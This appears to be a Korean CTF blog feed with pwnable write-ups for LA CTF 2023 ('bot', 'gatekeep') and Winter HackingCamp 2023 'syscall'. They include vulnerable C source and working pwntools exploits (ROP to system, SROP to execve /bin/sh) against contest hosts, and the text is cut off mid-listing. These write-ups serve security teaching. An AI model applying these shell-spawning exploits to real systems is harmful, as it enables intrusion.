        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>I made a bot to automatically answer all of your questions.<br><code>nc lac.tf 31180</code></p></blockquote><ul><li>[197 solves &#x2F; 363 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="type">char</span> input[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> give_flag = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hi, how can i help?&quot;</span>);</span><br><span class="line">  gets(input);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;lol no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;please give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;help, i have no idea how to solve this&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;L&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;may i have the flag?&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;not with that attitude&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;please please please give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;i&#x27;ll consider it&quot;</span>);</span><br><span class="line">    sleep(<span class="number">15</span>);</span><br><span class="line">    <span class="keyword">if</span> (give_flag) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ok here&#x27;s your flag&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry, i didn&#x27;t understand your question&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>give_flag</code> 변수 값을 입력 값을 통해서 바꿔줄 수가 없다. 다행히 <code>system</code> 함수 주소가 존재하니 bss 영역에 ‘&#x2F;bin&#x2F;sh\x00’을 쓰고 <code>system</code> 함수를 실행시키면 된다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bot&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31180</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./bot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40133b</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;may i have the flag?\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">64</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x404068</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x404068</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;hey_stop_bullying_my_bot_thats_not_nice&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - gatekeep</title>
      <link href="/230214-lactf2023-gatekeep/"/>
      <url>/230214-lactf2023-gatekeep/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><p>pwnable 문제도 많고 너무 재밌는 씨텝이었다. 내가 봤던 문제들에는 도커파일과 소스코드를 제공해주었다.</p><blockquote><p>If I gaslight you enough, you won’t be able to get my flag! :)<br><code>nc lac.tf 31121</code></p></blockquote><ul><li>[529 solves &#x2F; 138 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>친절하게</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_flag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    FILE* flagfile = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (flagfile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Cannot read flag.txt.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fgets(flag, <span class="number">256</span>, flagfile);</span><br><span class="line">        flag[<span class="built_in">strcspn</span>(flag, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">15</span>];</span><br><span class="line">    <span class="type">char</span> pass[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> access = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If my password is random, I can gatekeep my flag! :)</span></span><br><span class="line">    <span class="type">int</span> data = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (data &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t access /dev/urandom.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ssize_t</span> result = read(data, pass, <span class="keyword">sizeof</span> pass);</span><br><span class="line">        <span class="keyword">if</span> (result &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Data not received from /dev/urandom\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(data);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password:\n&quot;</span>);</span><br><span class="line">    gets(input); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(input, pass)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I swore that was the right password ...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        access = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(access) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Guess I couldn&#x27;t gaslight you!\n&quot;</span>);</span><br><span class="line">        print_flag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;If I gaslight you enough, you won&#x27;t be able to guess my password! :)\n&quot;</span>);</span><br><span class="line">    check();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gets</code> 함수는 BOF가 일어날 가능성이 존재한다. <code>/dev/urandom</code>에서 읽어온 값은 값을 leak하는 거 아닌 이상 정확한 값을 알 수가 없기 때문에 <code>strcmp(input, pass)</code>을 우회하여 <code>access</code>를 1로 세팅해줘야하는 방법을 생각해야 한다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>a</code>를 많이 보내주니 <code>print_flag</code> 함수가 실행되어 플래그를 획득할 수 있었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch gatekeep]$ nc lac.tf 31121</span><br><span class="line">aIf I gaslight you enough, you won&#x27;t be able to guess my password! :)</span><br><span class="line">Password:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">I swore that was the right password ...</span><br><span class="line">Guess I couldn&#x27;t gaslight you!</span><br><span class="line">lactf&#123;sCr3am1nG_cRy1Ng_tHr0w1ng_uP&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;sCr3am1nG_cRy1Ng_tHr0w1ng_uP&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Winter HackingCamp CTF 2023 - syscall (SROP)</title>
      <link href="/230211-hcamp2023w-syscall/"/>
      <url>/230211-hcamp2023w-syscall/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://hackingcamp.org/">http://hackingcamp.org/</a></li></ul><p>올해도 어김없이 해킹캠프 문제 출제를 하였다. 대회 시간이 꽤 짧고 다른 어려운 포너블 문제가 있기 때문에 문제 풀이 해주신 분들은 풀이가 상대적으로 쉬운 <code>Sigreturn-oriented programming(SROP)</code>를 이용하여 문제를 풀이해주셨을 것이라 생각된다. 나는 문제 출제하면서 두 가지 방법으로 풀이하였고 정작 <code>SROP</code>는 생각이 나지 않아 다른 방법으로 푼 후에 <code>SROP</code>로 풀이하였다.</p><p>롸업을 작성하면서 생각든 건데 seccomp과 같은 것을 두지 않았으니 서버에 존재하는 flag 파일의 이름을 알아낸 다음, <code>openat, read, write</code> 해서 문제를 풀이할 수 있을 것 같다. 해당 방법은 언인텐이 아니며 초심자를 위한 해킹캠프 취지에 맞게 다양한 풀이가 가능하도록 보호 기법을 강하게 제한을 두지 않았다. 개인적으로 flag 값을 읽어오는 것보단 쉘 따는 것이 더 재밌기 때문에.. 해당 풀이는 소개하지 않는다.</p><blockquote><p>원하는 system call을 실행시켜보자!<br><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a><br>tar -zxvf syscall-public.tar.gz</p></blockquote><ul><li>[ 3 solves &#x2F; 428 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = sys_write(<span class="number">1u</span>, gloabl_buf, <span class="number">0xC</span>uLL);</span><br><span class="line">  v4 = sys_read(<span class="number">0</span>, buf, <span class="number">0x250</span>uLL); <span class="comment">// overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>전역변수에 적힌 값을 출력하고, 지역변수에 값을 입력 받는데 여기서 overflow가 대놓고 발생한다. 주어진 코드는 이게 다고, 내가 작성한 것을 출력해 주는 기능이 현재로선 존재하지 않기 때문에 뭔갈 leak할 수도 없어 보인다. 그러나 함수 목록을 보면 아래와 같은 hint 함수가 존재하고 유용한 가젯이 보인다. </p><img src="/images/230211-hcamp2023w-syscall/Screenshot 2023-02-11 at 14.33.13.png" width=500/><br><p>보기 쉽게 나타내면 아래 두 가젯이 눈에 보인다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add rax, 0x1 ; ret ;</span><br><span class="line">syscall ; ret ;</span><br></pre></td></tr></table></figure><p>이것을 이용하여 우리는 원하는 system call을 실행시킬 수 있다. 문제 바이너리는 64bit 전용 ELF이니 문제 설명에 나와있던 사이트를 접속해보자.</p><ul><li><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></li></ul><p>overflow도 발생하겠다.. <code>rax</code> 레지스터를 조작하여 우리는 저 사이트에 있는 system call들을 실행시킬 수 있다.</p><h2 id="Solve-1-Sigreturn-oriented-programming-SROP"><a href="#Solve-1-Sigreturn-oriented-programming-SROP" class="headerlink" title="Solve 1 (Sigreturn-oriented programming(SROP))"></a>Solve 1 (Sigreturn-oriented programming(SROP))</h2><ul><li>Sigreturn system call을 사용하는 ROP 기법</li></ul><p>프로그램은 보안, 자원 관리 등의 이유로 user mode와 kernel mode를 왔다갔다 하면서 실행되는데 이 때 자원 공유가 필요하다. kernel mode에서 user mode로 갈 때 <code>Sigreturn system call</code>을 이용하여 user mode의 레지스터를 세팅한다. 저 시스템 콜을 사용하여 레지스터를 세팅할 때 값에 대한 검증이 이루어지지 않는다. 그래서 우리는 <code>Sigreturn system call</code>을 강제로 호출하여 레지스터를 마음대로 바꿀 수 있다.</p><p><code>pwntools</code>의 <code>frame = SigreturnFrame()</code>을 이용하여 매우 편리하게 코드를 작성할 수 있다.</p><ul><li>exploit 시나리오</li></ul><ol><li>전역변수에 <code>/bin/sh\x00</code> 작성 -&gt; <code>read(0, 0x404028, 8)</code></li><li>main으로 돌림</li><li><code>SigreturnFrame()</code>을 이용하여 편리하게 레지스터 세팅 -&gt; <code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code>을 실행시키기 위함</li><li><code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code> 실행</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;3.38.2.179&#x27;, 1337)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">32860</span>)</span><br><span class="line"></span><br><span class="line">add_rax = <span class="number">0x40110e</span></span><br><span class="line">syscall = <span class="number">0x401113</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4011c1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== first main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, 0x404028, 8)</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x404028</span>) <span class="comment"># bss</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== second main ====================</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = <span class="number">0x404028</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 0x0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf</span>): </span><br><span class="line">    payload += p64(add_rax)</span><br><span class="line"></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Solve-2-run-execute-‘-x2F-bin-x2F-sh-x00’-0-0"><a href="#Solve-2-run-execute-‘-x2F-bin-x2F-sh-x00’-0-0" class="headerlink" title="Solve 2 (run execute(‘&#x2F;bin&#x2F;sh\x00’, 0, 0))"></a>Solve 2 (run execute(‘&#x2F;bin&#x2F;sh\x00’, 0, 0))</h2><p>SROP 기법을 이용하지 않고 <code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code>을 실행시키는 것을 목표로 두는 풀이이다. </p><ol><li><p><code>write(1, stack주소, ?)</code> 호출<br>main 함수에서 <code>sys_read(0, buf, 0x250uLL);</code> 실행하고 난 뒤기 때문에 <code>rax</code> 레지스터와 <code>rdi</code> 레지스터만 수정해서 <code>write</code> 함수를 호출하여 stack 주소를 leak할 수 있다. (stack에 쓰여진 건 모두 leak할 수 있고 stack에는 stack 주소도 대부분 적혀있다.)</p></li><li><p><code>read(0, 0x404028, 8)</code> 호출<br>bss 영역에 ‘&#x2F;bin&#x2F;sh\x00’을 쓸 것이다. 쓰고 난 후 <code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code>을 실행할 예정이다.</p></li><li><p><code>execute(&#39;/bin/sh\x00&#39;, 0, 0)</code> 호출<br>인자 세 개를 조절해야 한다. 이 때 <code>rdx</code>를 조절하기 적당한 가젯이 없어서 <code>csu gadget</code>을 이용하였다.</p></li></ol><img src="/images/230211-hcamp2023w-syscall/Screenshot 2023-02-11 at 15.09.07.png" width=600/><p>이 때 <code>[r15 + rbx*8]</code> 에는 현재 작성한 payload의 아래 부분을 작성해주는 것이 유리하다. 1번 과정에서 stack 주소를 leak했으니 우리 payload가 어느 주소에 적힌지도 구할 수 있다. 익스 코드 주석을 보면 나는 <code>rdi</code> 레지스터를 세팅해주는 곳을 가리켰다. 정리하면 <code>csu</code> 가젯으로 <code>edi</code>, <code>rsi</code>, <code>rdx</code> 모두 세팅할 수 있는데 다 0으로 해놓고 후에 <code>rdi</code>를 다시 세팅해줬다.</p><p>편리하게 write, read, execute 함수 자체를 호출하는 것처럼 시나리오를 작성하였지만 호출해야할 것은 system call이라는 것을 잊지 말자. system call이니 만큼 함수를 호출하면 안되고 문제 설명의 사이트를 참고하여 올바른 값으로 <code>rax</code> 레지스터를 세팅한 다음 <code>syscall</code> 가젯을 호출해야 한다. 그리고 현재 레지스터의 상황에 맞게 <code>add rax, 0x1 ; ret ;</code> 가젯을 호출하자. 0x3b로 세팅해줘야 한다고 무작정 0x3b번 호출하면 안된다는 뜻이다. 왜냐하면 그 당시 <code>rax</code> 레지스터가 0이란 보장을 할 수 없기 때문이다. </p><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 